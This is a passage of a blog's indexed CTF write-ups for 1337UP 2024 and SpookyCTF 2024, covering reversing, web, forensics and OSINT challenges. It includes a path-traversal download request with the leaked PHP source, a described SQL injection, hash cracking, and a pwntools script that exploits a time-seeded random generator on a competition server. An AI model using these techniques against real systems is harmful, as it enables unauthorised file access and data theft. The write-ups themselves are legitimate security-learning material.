\"9425749445e494332757363353f5d6f50353b79445d7336343270373270366f586365753f546c60336f5\".slice(0x1c, 0x2a), \"9425749445e494332757363353f5d6f50353b79445d7336343270373270366f586365753f546c60336f5\".slice(0x2a, 0x38), \"9425749445e494332757363353f5d6f50353b79445d7336343270373270366f586365753f546c60336f5\".slice(0x38, 0x46), \"9425749445e494332757363353f5d6f50353b79445d7336343270373270366f586365753f546c60336f5\".slice(0x46, 0x54)]; let _0x4c2f5e = [_0x19eb60[0x3], _0x19eb60[0x5], _0x19eb60[0x1], _0x19eb60[0x4], _0x19eb60[0x2], _0x19eb60[0x0]]; let _0x22e526 = _0x4c2f5e.join('').split('').reverse().join(''); let _0x2051e9 = hexToBytes(_0x22e526); let _0x351569 = _0x2051e9.map(_0x585a6f =\u003e (0x9 * _0x585a6f + 0x7) % 0x100 ^ 0x33); return _0x351569.map(_0x5ca89b =\u003e ('0' + _0x5ca89b.toString(0x10)).slice(-0x2)).join(''); } So I console.logged _0x2051e9 because after that line some xor and math happens and I got the flag ! ","date":"2024-11-18","objectID":"/1337up-2024-full-writeup/:13:2","tags":["CRYPTO","OSINT","MISC","WEB","REVERSE","1337UP",2024],"title":"1337UP 2024 - Full Writeup","uri":"/1337up-2024-full-writeup/"},{"categories":["Writeups"],"content":"Phish Market Order Management - Rev ","date":"2024-11-18","objectID":"/1337up-2024-full-writeup/:14:0","tags":["CRYPTO","OSINT","MISC","WEB","REVERSE","1337UP",2024],"title":"1337UP 2024 - Full Writeup","uri":"/1337up-2024-full-writeup/"},{"categories":["Writeups"],"content":"Description Welcome to the Phish Market Order Management System! This system will allow you to view important information about the Phish Market’s products and customers. ","date":"2024-11-18","objectID":"/1337up-2024-full-writeup/:14:1","tags":["CRYPTO","OSINT","MISC","WEB","REVERSE","1337UP",2024],"title":"1337UP 2024 - Full Writeup","uri":"/1337up-2024-full-writeup/"},{"categories":["Writeups"],"content":"Explanation First step was to gain the admin password : the condition checks if sub_40359c returns false : and this function calls sub_4034c9 : which I assumed encrypts the string INTRIGITI1337UP# with a xor key, however I was missing the key… Good thing is retdec exposes the key : the password was “N3v3RG0nn@6u3$$!” I couldn’t simply cat the flag because my input was part of a sql query, except this query was vulnerable to SQLi : it should be like this : With a quote added to the end, so I ran a union select query BUT the results were being converted to decimal, so what I did was to take just 1 character off the flag, convert it to decimal, then display it : ","date":"2024-11-18","objectID":"/1337up-2024-full-writeup/:14:2","tags":["CRYPTO","OSINT","MISC","WEB","REVERSE","1337UP",2024],"title":"1337UP 2024 - Full Writeup","uri":"/1337up-2024-full-writeup/"},{"categories":["Writeups"],"content":"Rigged Slot Machine 1 - Rev ","date":"2024-11-18","objectID":"/1337up-2024-full-writeup/:15:0","tags":["CRYPTO","OSINT","MISC","WEB","REVERSE","1337UP",2024],"title":"1337UP 2024 - Full Writeup","uri":"/1337up-2024-full-writeup/"},{"categories":["Writeups"],"content":"Description The casino thinks they’ve rigged their slots so well, they can give every player $100 free play! Of course, there’s always some small print: you can’t cash out unless you hit the jackpot and each player only gets 3 minutes play time ","date":"2024-11-18","objectID":"/1337up-2024-full-writeup/:15:1","tags":["CRYPTO","OSINT","MISC","WEB","REVERSE","1337UP",2024],"title":"1337UP 2024 - Full Writeup","uri":"/1337up-2024-full-writeup/"},{"categories":["Writeups"],"content":"Explanation If we reverse the binary we’ll find that we’ll have to reach a balance of 133742 dollars…Good thing is the outcome is determined by rand() which uses the current time as a seed. I made a quick program in c that generates a hashmap of 10k elements, 1 for win and 0 for loss : #include \u003cstdio.h\u003e #include \u003cstdlib.h\u003e #include \u003ctime.h\u003e #include \u003cunistd.h\u003e // Define the size of the \"hashmap\" #define NUM_RANDOMS 100000 // Array to store pre-generated random numbers int random_numbers[NUM_RANDOMS]; // Array to store outcome map int outcome_map[NUM_RANDOMS]; // Function to analyze the outcome based on random value void analyze_outcome(int rand_val, int index) { if (rand_val == 0) { outcome_map[index] = 1; // Win } else if (rand_val \u003c 10) { outcome_map[index] = 1; // Win } else if (rand_val \u003c 15) { outcome_map[index] = 1; // Win } else if (rand_val \u003c 20) { outcome_map[index] = 1; // Win } else if (rand_val \u003c 30) { outcome_map[index] = 1; // Break-even counts as Win } else { outcome_map[index] = 0; // Loss } printf(\"%d \", outcome_map[index]); } int main() { char input; int index = 0; // Seed random number generator srand(time(NULL)); // Generate and store random numbers in the array for (int i = 0; i \u003c NUM_RANDOMS; i++) { analyze_outcome(rand() % 100, i); } return 0; } Could’ve improved the code but whatever… Then here’s the pwntools script for automating the bets : from pwn import * # Connect to the predictor process #print(stringlist_list) # Start the second process #p = process('./rigged_slot1') p = remote('riggedslot1.ctf.intigriti.io', 1332) r = process('./predictor') # Receive all data from the process stringlist = r.recvall() # Decode the bytes object to a string decoded_stringlist = stringlist.decode('utf-8') # Convert the string to a list by splitting on spaces stringlist_list = decoded_stringlist.split(' ') response = b'100' for n in stringlist_list: # Send the number to the process if int(response) \u003e 100: response = b'100' if n == '1': p.sendline(response) print(\"Sent: 100\") # Receive the response from the process else: p.sendline(b'1') print(\"Sent: 1\") # Receive the response from the process response = p.recvline_startswith(b'Current Balance: ') response = response.split(b'$')[1] print(\"balance : \",int(response)) if int(response) \u003e= 133742: break print(p.recvall()) ","date":"2024-11-18","objectID":"/1337up-2024-full-writeup/:15:2","tags":["CRYPTO","OSINT","MISC","WEB","REVERSE","1337UP",2024],"title":"1337UP 2024 - Full Writeup","uri":"/1337up-2024-full-writeup/"},{"categories":["Writeups"],"content":"Secure Bank - Rev ","date":"2024-11-18","objectID":"/1337up-2024-full-writeup/:16:0","tags":["CRYPTO","OSINT","MISC","WEB","REVERSE","1337UP",2024],"title":"1337UP 2024 - Full Writeup","uri":"/1337up-2024-full-writeup/"},{"categories":["Writeups"],"content":"Description Can you crack the bank? nc securebank.ctf.intigriti.io 1335 ","date":"2024-11-18","objectID":"/1337up-2024-full-writeup/:16:1","tags":["CRYPTO","OSINT","MISC","WEB","REVERSE","1337UP",2024],"title":"1337UP 2024 - Full Writeup","uri":"/1337up-2024-full-writeup/"},{"categories":["Writeups"],"content":"Explanation First key was 1337, easily found by decompiling the binary. For the second key. It felt easier to just run gdb and look at what the input is being compared with. ","date":"2024-11-18","objectID":"/1337up-2024-full-writeup/:16:2","tags":["CRYPTO","OSINT","MISC","WEB","REVERSE","1337UP",2024],"title":"1337UP 2024 - Full Writeup","uri":"/1337up-2024-full-writeup/"},{"categories":["Writeups"],"content":"TriForce Recon - Rev ","date":"2024-11-18","objectID":"/1337up-2024-full-writeup/:17:0","tags":["CRYPTO","OSINT","MISC","WEB","REVERSE","1337UP",2024],"title":"1337UP 2024 - Full Writeup","uri":"/1337up-2024-full-writeup/"},{"categories":["Writeups"],"content":"Description you have intercepted a classified message that has been divided into three encrypted executables and were each hidden on different operating systems. Flag format: INTGRITI{Flag1+Flag2+Flag3} ","date":"2024-11-18","objectID":"/1337up-2024-full-writeup/:17:1","tags":["CRYPTO","OSINT","MISC","WEB","REVERSE","1337UP",2024],"title":"1337UP 2024 - Full Writeup","uri":"/1337up-2024-full-writeup/"},{"categories":["Writeups"],"content":"Explanation We get the first part by reversing the program’s algorithm : def xor_decrypt(encrypted: bytearray, key: str) -\u003e str: decrypted = bytearray(len(encrypted)) key_length = len(key) for i in range(len(encrypted)): decrypted[i] = encrypted[i] ^ ord(key[i % key_length]) return decrypted.decode('utf-8') def hex_to_string(hex_str: str) -\u003e bytearray: byte_array = bytearray() for i in range(0, len(hex_str), 2): byte_array.append(int(hex_str[i:i+2], 16)) return byte_array hex_string = \"7e54595f09434b0f4a5d59757b514a5b6d550d0f0c765b7d45\" key = \"8\" encrypted_data = hex_to_string(hex_string) flag = xor_decrypt(encrypted_data, key) print(\"Correct flag:\", flag) Flag1{s7reaMCircUm574NcE} We can aquire the second part by running Courage.out, it’s an ELF. Same code as part1 : hex string is 775a5051034d5644706002635f467d0570030558454b and key is 16 Flag2{grAV3UnpL3A54nt} Third part is the exact same code again just change the hex string to 755e525500496177065b057c076602025d6152467a0755735046025d5d4f and the key to 32. Flag3{RE5i6N4T10nSatI5fAct1on} ","date":"2024-11-18","objectID":"/1337up-2024-full-writeup/:17:2","tags":["CRYPTO","OSINT","MISC","WEB","REVERSE","1337UP",2024],"title":"1337UP 2024 - Full Writeup","uri":"/1337up-2024-full-writeup/"},{"categories":["Writeups"],"content":"Pizza Paradise - Web ","date":"2024-11-18","objectID":"/1337up-2024-full-writeup/:18:0","tags":["CRYPTO","OSINT","MISC","WEB","REVERSE","1337UP",2024],"title":"1337UP 2024 - Full Writeup","uri":"/1337up-2024-full-writeup/"},{"categories":["Writeups"],"content":"Description Something weird going on at this pizza store!! ","date":"2024-11-18","objectID":"/1337up-2024-full-writeup/:18:1","tags":["CRYPTO","OSINT","MISC","WEB","REVERSE","1337UP",2024],"title":"1337UP 2024 - Full Writeup","uri":"/1337up-2024-full-writeup/"},{"categories":["Writeups"],"content":"Explanation First things first let’s check if the site has robots.txt : User-agent: * Disallow: /secret_172346606e1d24062e891d537e917a90.html Disallow: /assets/ Yep, let’s head to this url : Woah government files ??? \u003c!DOCTYPE html\u003e \u003chtml lang=\"en\"\u003e \u003chead\u003e \u003cmeta charset=\"UTF-8\" /\u003e \u003ctitle\u003eTop Secret Government Access\u003c/title\u003e \u003clink href=\"https://fonts.googleapis.com/css2?family=Orbitron\u0026display=swap\" rel=\"stylesheet\" /\u003e \u003clink rel=\"stylesheet\" href=\"/assets/css/secret-theme.css\" /\u003e \u003cscript src=\"/assets/js/auth.js\"\u003e\u003c/script\u003e \u003cscript src=\"https://cdnjs.cloudflare.com/ajax/libs/crypto-js/4.1.1/crypto-js.min.js\"\u003e\u003c/script\u003e \u003cscript\u003e function hashPassword(password) { return CryptoJS.SHA256(password).toString(); } function validate() { const username = document.getElementById(\"username\").value; const password = document.getElementById(\"password\").value; const credentials = getCredentials(); const passwordHash = hashPassword(password); if ( username === credentials.username \u0026\u0026 passwordHash === credentials.passwordHash ) { return true; } else { alert(\"Invalid credentials!\"); return false; } } \u003c/script\u003e \u003c/head\u003e \u003cbody\u003e \u003cdiv class=\"container\"\u003e \u003ch1\u003eTop Secret Government Access\u003c/h1\u003e \u003cform id=\"loginForm\" action=\"login.php\" method=\"POST\" onsubmit=\"return validate();\"\u003e \u003clabel for=\"username\"\u003eUsername:\u003c/label\u003e \u003cinput type=\"text\" id=\"username\" name=\"username\" required /\u003e\u003cbr /\u003e \u003clabel for=\"password\"\u003ePassword:\u003c/label\u003e \u003cinput type=\"password\" id=\"password\" name=\"password\" required /\u003e\u003cbr /\u003e \u003cinput type=\"submit\" value=\"Login\" /\u003e \u003c/form\u003e \u003c/div\u003e \u003c/body\u003e \u003c/html\u003e Interesting, let’s check the js file : const validUsername = \"agent_1337\"; const validPasswordHash = \"91a915b6bdcfb47045859288a9e2bd651af246f07a083f11958550056bed8eac\"; function getCredentials() { return { username: validUsername, passwordHash: validPasswordHash, }; } An easily crackable password hash, thank God : and we’re in : For now we can only download a handful of files, but we can do a little trick : GET /topsecret_a9aedc6c39f654e55275ad8e65e316b3.php?download=/assets/images/../../topsecret_a9aedc6c39f654e55275ad8e65e316b3.php Voila : HTTP/2 200 OK Date: Sat, 16 Nov 2024 13:49:46 GMT Content-Type: application/octet-stream Content-Length: 1819 Server: istio-envoy X-Powered-By: PHP/8.3.13 Content-Disposition: attachment; filename=\"topsecret_a9aedc6c39f654e55275ad8e65e316b3.php\" X-Envoy-Upstream-Service-Time: 1 \u003c?php $flag = 'INTIGRITI{70p_53cr37_m15510n_c0mpl373}'; if (isset($_GET['download'])) { $file = $_GET['download']; if (strpos($file, '/assets/images/') === 0) { $filePath = __DIR__ . '/' . $file; if (file_exists($filePath)) { header('Content-Type: application/octet-stream'); header('Content-Disposition: attachment; filename=\"' . basename($filePath) . '\"'); header('Content-Length: ' . filesize($filePath)); readfile($filePath); exit(); } else { die('File not found!'); } } else { die('File path not allowed!'); } } ?\u003e \u003c!DOCTYPE html\u003e \u003chtml lang=\"en\"\u003e \u003chead\u003e \u003cmeta charset=\"UTF-8\"\u003e \u003ctitle\u003eTop Secret Portal\u003c/title\u003e \u003clink href=\"https://fonts.googleapis.com/css2?family=Orbitron\u0026display=swap\" rel=\"stylesheet\"\u003e \u003clink rel=\"stylesheet\" href=\"/assets/css/secret-theme.css\"\u003e \u003cscript src=\"/assets/js/displayImage.js\"\u003e\u003c/script\u003e \u003c/head\u003e \u003cbody\u003e \u003cdiv class=\"container\"\u003e \u003ch1\u003eWelcome to the Top Secret Government Portal\u003c/h1\u003e \u003cp\u003eAuthorized personnel only.\u003c/p\u003e \u003cimg id=\"selectedImage\" src=\"/assets/images/topsecret1.png\" alt=\"Selected Image\"\u003e \u003cform method=\"GET\" action=\"\"\u003e \u003clabel for=\"image\"\u003eSelect Image to Download:\u003c/label\u003e \u003cselect name=\"download\" id=\"image\" onchange=\"updateImage()\"\u003e \u003coption value=\"/assets/images/topsecret1.png\"\u003eImage 1\u003c/option\u003e \u003coption value=\"/assets/images/topsecret2.png\"\u003eImage 2\u003c/option\u003e \u003coption value=\"/assets/images/topsecret3.png\"\u003eImage 3\u003c/option\u003e \u003coption value=\"/assets/images/topsecret4.png\"\u003eImage 4\u003c/option\u003e \u003c/select\u003e \u003cbutton type=\"submit\"\u003eDownload\u003c/button\u003e \u003c/form\u003e \u003c/div\u003e \u003c/body\u003e \u003c/html\u003e ","date":"2024-11-18","objectID":"/1337up-2024-full-writeup/:18:2","tags":["CRYPTO","OSINT","MISC","WEB","REVERSE","1337UP",2024],"title":"1337UP 2024 - Full Writeup","uri":"/1337up-2024-full-writeup/"},{"categories":["Writeups"],"content":"Intro This CTF was fun and I would recommend it for beginners ! On par with DeadFace. This writeup contains all the challanges that I have solved (14 challenges). The categories were : Forensics, Osint, Steganography, Misc and Web (Well, technically it’s Reverse). ","date":"2024-10-30","objectID":"/spookyctf-2024-full-writeup/:1:0","tags":["FORENSICS","OSINT","STEGANO","MISC","WEB","REVERSE","SPOOKYCTF",2024],"title":"SpookyCTF 2024 - Full Writeup","uri":"/spookyctf-2024-full-writeup/"},{"categories":["Writeups"],"content":"memory-puzzle - Forensics ","date":"2024-10-30","objectID":"/spookyctf-2024-full-writeup/:2:0","tags":["FORENSICS","OSINT","STEGANO","MISC","WEB","REVERSE","SPOOKYCTF",2024],"title":"SpookyCTF 2024 - Full Writeup","uri":"/spookyctf-2024-full-writeup/"},{"categories":["Writeups"],"content":"Description The Consortium has concealed a critical file within a memory dump, protected by layers of digital obfuscation. Led by Simon Letti, participants must sift through the volatile memory landscape to locate a plaintext key that unlocks the encrypted file. Time is of the essence, as Roko’s Basilisk threatens to distort the data with each passing moment. Can you unravel the puzzle before the Basilisk intervenes? “Basilisk’s whisper will not wait” echos through your mind as you enter the file. (Note: If you choose to use volatility2.6, use profile Win10x64_19041) ","date":"2024-10-30","objectID":"/spookyctf-2024-full-writeup/:2:1","tags":["FORENSICS","OSINT","STEGANO","MISC","WEB","REVERSE","SPOOKYCTF",2024],"title":"SpookyCTF 2024 - Full Writeup","uri":"/spookyctf-2024-full-writeup/"},{"categories":["Writeups"],"content":"Explanation Keep digging with Volatility… You’ll have to manually keep looking till you find flag.enc and system-update.exe. reverse engineer system-update.exe you’ll find the flag was AES encrypted and the key was SuperSecretKey12 So I wrote a decryption script : #include \u003copenssl/evp.h\u003e #include \u003cstdio.h\u003e #include \u003cstring.h\u003e int main() { FILE *enc_file = fopen(\"flag.enc\", \"rb\"); FILE *dec_file = fopen(\"flag_decrypted.txt\", \"wb\"); if (!enc_file || !dec_file) { fprintf(stderr, \"Error opening files.\\n\"); return 1; } const char *key = \"SuperSecretKey12\"; // Same key used in encryption unsigned char iv[16] = {0}; // All zero IV as in encryption unsigned char enc_buf[1024], dec_buf[1024 + EVP_MAX_BLOCK_LENGTH]; int len, dec_len; EVP_CIPHER_CTX *ctx = EVP_CIPHER_CTX_new(); if (!ctx) { fprintf(stderr, \"Failed to create EVP_CIPHER_CTX\\n\"); return 1; } if (EVP_DecryptInit_ex(ctx, EVP_aes_128_cbc(), NULL, (unsigned char *)key, iv) != 1) { fprintf(stderr, \"Failed to initialize decryption\\n\"); EVP_CIPHER_CTX_free(ctx); return 1; } while ((len = fread(enc_buf, 1, sizeof(enc_buf), enc_file)) \u003e 0) { if (EVP_DecryptUpdate(ctx, dec_buf, \u0026dec_len, enc_buf, len) != 1) { fprintf(stderr, \"Decryption update failed\\n\"); EVP_CIPHER_CTX_free(ctx); return 1; } fwrite(dec_buf, 1, dec_len, dec_file); } if (EVP_DecryptFinal_ex(ctx, dec_buf, \u0026dec_len) != 1) { fprintf(stderr, \"Final decryption step failed\\n\"); EVP_CIPHER_CTX_free(ctx); return 1; } fwrite(dec_buf, 1, dec_len, dec_file); EVP_CIPHER_CTX_free(ctx); fclose(enc_file); fclose(dec_file); printf(\"Decryption complete. Output saved to flag_decrypted.txt\\n\"); return 0; } ","date":"2024-10-30","objectID":"/spookyctf-2024-full-writeup/:2:2","tags":["FORENSICS","OSINT","STEGANO","MISC","WEB","REVERSE","SPOOKYCTF",2024],"title":"SpookyCTF 2024 - Full Writeup","uri":"/spookyctf-2024-full-writeup/"},{"categories":["Writeups"],"content":"wont-somebody-think-of-the-children - Forensics ","date":"2024-10-30","objectID":"/spookyctf-2024-full-writeup/:3:0","tags":["FORENSICS","OSINT","STEGANO","MISC","WEB","REVERSE","SPOOKYCTF",2024],"title":"SpookyCTF 2024 - Full Writeup","uri":"/spookyctf-2024-full-writeup/"},{"categories":["Writeups"],"content":"Description If Loab is back, we might need the council to help us out. The problem is that Anna sent Maya looking for them but she still hasn’t come back. This is her last known location… Maybe you can help find her. I’d go, but I really don’t want to be around those spooky ghost orphans. ","date":"2024-10-30","objectID":"/spookyctf-2024-full-writeup/:3:1","tags":["FORENSICS","OSINT","STEGANO","MISC","WEB","REVERSE","SPOOKYCTF",2024],"title":"SpookyCTF 2024 - Full Writeup","uri":"/spookyctf-2024-full-writeup/"},{"categories":["Writeups"],"content":"Explanation SVGs are like onions. Onions have layers, SVGs have layers. Get it ? If you open up an SVG file you’ll find that it has a bunch of base64 encoded images. So I wrote a script to extract all the images : import re import base64 import os ## Read SVG file with open(\"orphans2.svg\", \"r\") as file: svg_content = file.read() ## Find all base64 image data using regex image_data = re.findall(r'href=\"data:image/png;base64,([^\"]+)\"', svg_content) ## Create a folder to save extracted images output_folder = \"extracted_images\" os.makedirs(output_folder, exist_ok=True) ## Decode and save each image for i, data in enumerate(image_data, 1): img_data = base64.b64decode(data) img_path = os.path.join(output_folder, f\"image_{i}.png\") with open(img_path, \"wb\") as img_file: img_file.write(img_data) print(f\"Extracted {len(image_data)} images to '{output_folder}'\") ","date":"2024-10-30","objectID":"/spookyctf-2024-full-writeup/:3:2","tags":["FORENSICS","OSINT","STEGANO","MISC","WEB","REVERSE","SPOOKYCTF",2024],"title":"SpookyCTF 2024 - Full Writeup","uri":"/spookyctf-2024-full-writeup/"},{"categories":["Writeups"],"content":"strange-sightings - Misc ","date":"2024-10-30","objectID":"/spookyctf-2024-full-writeup/:4:0","tags":["FORENSICS","OSINT","STEGANO","MISC","WEB","REVERSE","SPOOKYCTF",2024],"title":"SpookyCTF 2024 - Full Writeup","uri":"/spookyctf-2024-full-writeup/"},{"categories":["Writeups"],"content":"Description NICC agents were sent this video by an anonymous source. What does it mean?! Warning: The video is very spooky. ","date":"2024-10-30","objectID":"/spookyctf-2024-full-writeup/:4:1","tags":["FORENSICS","OSINT","STEGANO","MISC","WEB","REVERSE","SPOOKYCTF",2024],"title":"SpookyCTF 2024 - Full Writeup","uri":"/spookyctf-2024-full-writeup/"},{"categories":["Writeups"],"content":"Explanation The video was indeed spooky, there was a lot of fake signs which wasted me a lot of time but in the end I figured out that the light switching on and off clip had to be a morse code. Using pen and paper I wrote down the morse code which ended up being an address, I scanned it with nmap and found that the FTP port was open, connected to it, got an error that mentioned anonymity so I logged in as anonymous and there it was, the flag ! ","date":"2024-10-30","objectID":"/spookyctf-2024-full-writeup/:4:2","tags":["FORENSICS","OSINT","STEGANO","MISC","WEB","REVERSE","SPOOKYCTF",2024],"title":"SpookyCTF 2024 - Full Writeup","uri":"/spookyctf-2024-full-writeup/"},{"categories":["Writeups"],"content":"the-true-bloop - Misc ","date":"2024-10-30","objectID":"/spookyctf-2024-full-writeup/:5:0","tags":["FORENSICS","OSINT","STEGANO","MISC","WEB","REVERSE","SPOOKYCTF",2024],"title":"SpookyCTF 2024 - Full Writeup","uri":"/spookyctf-2024-full-writeup/"},{"categories":["Writeups"],"content":"Description In 1997, an underwater anomaly was recorded by the NOAA (National Ocean and Atmospheric Administration). No explanation for the sound could be given at the time, but eventually a widely accepted answer elaborating on glacial movements surfaced. At least, that’s what we thought. Recently, in her exploits across time, Mary Morse of NICC has ended up in 1997 to uncover the “truth” as she playfully calls it. Her whereabouts are currently unknown (as always), but a series of tones were presumably sent by her deep beneath the sea. They were recorded, augmented, and kept for years by NOAA staff in addition to the titular bloop. Perhaps she discovered something so foreboding it had to be hidden? We were able to crack the first part - g4ed_j05_dX_b0Ww0q_0f_wu4rcK. Looks to be a Vigenere cipher encoded with a key. Your job is to find the key to go with this cipher and break it. (After cracking the Vigenere cipher, place it between the curly braces in NICC{}!). ","date":"2024-10-30","objectID":"/spookyctf-2024-full-writeup/:5:1","tags":["FORENSICS","OSINT","STEGANO","MISC","WEB","REVERSE","SPOOKYCTF",2024],"title":"SpookyCTF 2024 - Full Writeup","uri":"/spookyctf-2024-full-writeup/"},{"categories":["Writeups"],"content":"Explanation We have 4 wav files, and I play the guitar (flex), so I figured out the notes easily (coughcough perfect pitch), the key was “DEAD” or Dsus2 (another flex). Use the vigenere cipher to decode the flag. ","date":"2024-10-30","objectID":"/spookyctf-2024-full-writeup/:5:2","tags":["FORENSICS","OSINT","STEGANO","MISC","WEB","REVERSE","SPOOKYCTF",2024],"title":"SpookyCTF 2024 - Full Writeup","uri":"/spookyctf-2024-full-writeup/"},{"categories":["Writeups"],"content":"two-frames-one-champ - Misc ","date":"2024-10-30","objectID":"/spookyctf-2024-full-writeup/:6:0","tags":["FORENSICS","OSINT","STEGANO","MISC","WEB","REVERSE","SPOOKYCTF",2024],"title":"SpookyCTF 2024 - Full Writeup","uri":"/spookyctf-2024-full-writeup/"},{"categories":["Writeups"],"content":"Description Lake Champlain has always been a hotspot for mysterious sightings, but it seems like something recently odd came up. Apparently an old cryptid hunter went missing after attempting to reveal his findings. Rumors have been spreading that the cryptid hunter was once affiliated with the Consortium. But anything they left behind? An broken hard drive. Simon was able to recover the hard drive. Unfortunately, he was only able to recover two images files that are corrupted, likely tampered by the Consortium. Anna is tasking you to JOIN Simon piece this puzzle TOGETHER to uncover what the Consortium are hiding. ","date":"2024-10-30","objectID":"/spookyctf-2024-full-writeup/:6:1","tags":["FORENSICS","OSINT","STEGANO","MISC","WEB","REVERSE","SPOOKYCTF",2024],"title":"SpookyCTF 2024 - Full Writeup","uri":"/spookyctf-2024-full-writeup/"},{"categories":["Writeups"],"content":"Explanation Both images are corrupted, thankfully only the header is corrupted, we know they’re PNGs so we know what the actual header is. Then use stegsolve to xor both images : ","date":"2024-10-30","objectID":"/spookyctf-2024-full-writeup/:6:2","tags":["FORENSICS","OSINT","STEGANO","MISC","WEB","REVERSE","SPOOKYCTF",2024],"title":"SpookyCTF 2024 - Full Writeup","uri":"/spookyctf-2024-full-writeup/"},{"categories":["Writeups"],"content":"among-us - Osint ","date":"2024-10-30","objectID":"/spookyctf-2024-full-writeup/:7:0","tags":["FORENSICS","OSINT","STEGANO","MISC","WEB","REVERSE","SPOOKYCTF",2024],"title":"SpookyCTF 2024 - Full Writeup","uri":"/spookyctf-2024-full-writeup/"},{"categories":["Writeups"],"content":"Description The Jersey Devil is opening up a secondary shop in his hometown of the New Jersey Pine Barrens, with the other in dystopian New York City. With the opening of the shop in New Jersey, he would need to spend more time here. A video game is said to have the name of the shop the Jersey Devil owns. Find the name of the game and the name of the shop: Example: NICC{Name_of_Video_Game_Name_of_Shop} ","date":"2024-10-30","objectID":"/spookyctf-2024-full-writeup/:7:1","tags":["FORENSICS","OSINT","STEGANO","MISC","WEB","REVERSE","SPOOKYCTF",2024],"title":"SpookyCTF 2024 - Full Writeup","uri":"/spookyctf-2024-full-writeup/"},{"categories":["Writeups"],"content":"Hint The sequeal to this game is set to release this year. ","date":"2024-10-30","objectID":"/spookyctf-2024-full-writeup/:7:2","tags":["FORENSICS","OSINT","STEGANO","MISC","WEB","REVERSE","SPOOKYCTF",2024],"title":"SpookyCTF 2024 - Full Writeup","uri":"/spookyctf-2024-full-writeup/"},{"categories":["Writeups"],"content":"Explanation The title itself is a hint, nope not the hit game among us, it’s actually the wolf among us. At first I thought the place was real, but there’s nothing in Pine Barrens, so I googled Among us Jersey Devil and found this wiki page where it states that the Jersey Devil owned a shop in Fabletown NYC called Lucky Pawn ! ","date":"2024-10-30","objectID":"/spookyctf-2024-full-writeup/:7:3","tags":["FORENSICS","OSINT","STEGANO","MISC","WEB","REVERSE","SPOOKYCTF",2024],"title":"SpookyCTF 2024 - Full Writeup","uri":"/spookyctf-2024-full-writeup/"},{"categories":["Writeups"],"content":"cryptid-chats - Osint ","date":"2024-10-30","objectID":"/spookyctf-2024-full-writeup/:8:0","tags":["FORENSICS","OSINT","STEGANO","MISC","WEB","REVERSE","SPOOKYCTF",2024],"title":"SpookyCTF 2024 - Full Writeup","uri":"/spookyctf-2024-full-writeup/"},{"categories":["Writeups"],"content":"Description We know the Dr. Tom is currently on the lookout for another cryptid. We think he might have made a mistake and is instead following someone in a costume. We got a tip that Dr. Tom was harassing a famous actor who happened to be in costume for their upcoming movie and was simply visiting a business because they had posted about him recently on their social media. We hacked into Dr. Tom’s phone and got a picture from where he started and the path he took. It must’ve been pretty realistic - do you know what the character is called? ","date":"2024-10-30","objectID":"/spookyctf-2024-full-writeup/:8:1","tags":["FORENSICS","OSINT","STEGANO","MISC","WEB","REVERSE","SPOOKYCTF",2024],"title":"SpookyCTF 2024 - Full Writeup","uri":"/spookyctf-2024-full-writeup/"},{"categories":["Writeups"],"content":"Explanation You’ll have to simply follow the path Dr. Tom took, Some places don’t have streetmaps like the bike path so you’ll have to switch views. As you head to the drug store the brick sign is NOT the stone sign, you’ll have to keep going until you find this place: Look up their facebook page and there you’ll find a pic of Ethan Hawke : So to save time I just googled Ethan Hawke upcoming movie, he’s playing The Grabber. ","date":"2024-10-30","objectID":"/spookyctf-2024-full-writeup/:8:2","tags":["FORENSICS","OSINT","STEGANO","MISC","WEB","REVERSE","SPOOKYCTF",2024],"title":"SpookyCTF 2024 - Full Writeup","uri":"/spookyctf-2024-full-writeup/"},{"categories":["Writeups"],"content":"perfect-nba-fit - Osint ","date":"2024-10-30","objectID":"/spookyctf-2024-full-writeup/:9:0","tags":["FORENSICS","OSINT","STEGANO","MISC","WEB","REVERSE","SPOOKYCTF",2024],"title":"SpookyCTF 2024 - Full Writeup","uri":"/spookyctf-2024-full-writeup/"},{"categories":["Writeups"],"content":"Description NJIT has a pretty good basketball team, but we could use some taller players to give us a big step in the right direction. We heard there was a creature in NJ who is a perfect fit, but we’ve got to find where they are. We heard they were last seen about 5 - 7 years ago, but can’t remember the specifics - just that it was here in NJ and within a couple of hours of the school. Most of us commute anyway, so what’s an hour or so to help our Highlanders get the edge? Can you find where they were last seen? We need to be as specific as possible- anything less than a Class A sighting in NJ will not do. Get the exact day of the month, the approximate time using the 24 hour format, nearest road number and nearest town. NICC{DayOfTheMonth_HH:MM_Road-Name_Town-Name} Example: NICC{10_20:30_Interstate-280_Newark} ","date":"2024-10-30","objectID":"/spookyctf-2024-full-writeup/:9:1","tags":["FORENSICS","OSINT","STEGANO","MISC","WEB","REVERSE","SPOOKYCTF",2024],"title":"SpookyCTF 2024 - Full Writeup","uri":"/spookyctf-2024-full-writeup/"},{"categories":["Writeups"],"content":"Explanation Big step is a keyword, the perfect fit is no other than Big Foot himself. I searched Big foot sightings on Google and found this site. Found a Class A sighting in New Jersey and gave the report to GPT to pretty much extract what I wanted cause I’m too lazy to read :) ","date":"2024-10-30","objectID":"/spookyctf-2024-full-writeup/:9:2","tags":["FORENSICS","OSINT","STEGANO","MISC","WEB","REVERSE","SPOOKYCTF",2024],"title":"SpookyCTF 2024 - Full Writeup","uri":"/spookyctf-2024-full-writeup/"},{"categories":["Writeups"],"content":"they-have-returned - Osint ","date":"2024-10-30","objectID":"/spookyctf-2024-full-writeup/:10:0","tags":["FORENSICS","OSINT","STEGANO","MISC","WEB","REVERSE","SPOOKYCTF",2024],"title":"SpookyCTF 2024 - Full Writeup","uri":"/spookyctf-2024-full-writeup/"},{"categories":["Writeups"],"content":"Description Some user has came back nearly a year and a half after no known online activites to wreck havoc across the timeline. Their activity seems to suggest an attack is coming soon! ","date":"2024-10-30","objectID":"/spookyctf-2024-full-writeup/:10:1","tags":["FORENSICS","OSINT","STEGANO","MISC","WEB","REVERSE","SPOOKYCTF",2024],"title":"SpookyCTF 2024 - Full Writeup","uri":"/spookyctf-2024-full-writeup/"},{"categories":["Writeups"],"content":"Hint Navigate to the arrivals channel for possible leads to the suspected user. ","date":"2024-10-30","objectID":"/spookyctf-2024-full-writeup/:11:0","tags":["FORENSICS","OSINT","STEGANO","MISC","WEB","REVERSE","SPOOKYCTF",2024],"title":"SpookyCTF 2024 - Full Writeup","uri":"/spookyctf-2024-full-writeup/"},{"categories":["Writeups"],"content":"Explanation A bit guessy, but to solve it you had to figure out that they’re referencing the Terminator’s famous quote : “I’ll be back”. Anyway there’s someone on the discord that has Arnold as their avatar, Check their profil you’ll find their Twitter from there you can get the flag. 